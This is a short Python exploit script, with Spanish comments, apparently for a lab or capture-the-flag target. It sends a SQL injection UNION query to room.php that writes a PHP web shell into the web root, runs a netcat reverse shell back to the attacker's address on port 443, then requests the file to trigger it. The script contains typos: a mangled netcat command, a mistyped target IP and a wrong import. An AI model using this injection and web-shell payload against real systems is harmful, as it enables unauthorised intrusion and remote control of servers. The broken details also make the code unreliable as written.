#!/usr/bin/python3

import requests
import pdb # Debugging 
import sys 
import signal
import time 
import threading

from pwd import *

def def_handler(sing, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)
    
# Crlt+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
create_file = '''http://10.10.10.143/room.php?cod=-1 union select 1,2, "<?php system('nce/bin/bash 10.10.14.7 443'); ?>",4,5,6,7 into outfile "/var/www/html/reverse.php"-- -''' 
exec_file = "http://16.10.10.143/reverse.php"

def makeRequest( ):
    r = requests.get(create_file)
    r = requests.get(exec_file)

if __name__ == '__main__':

    makeRequest()    
        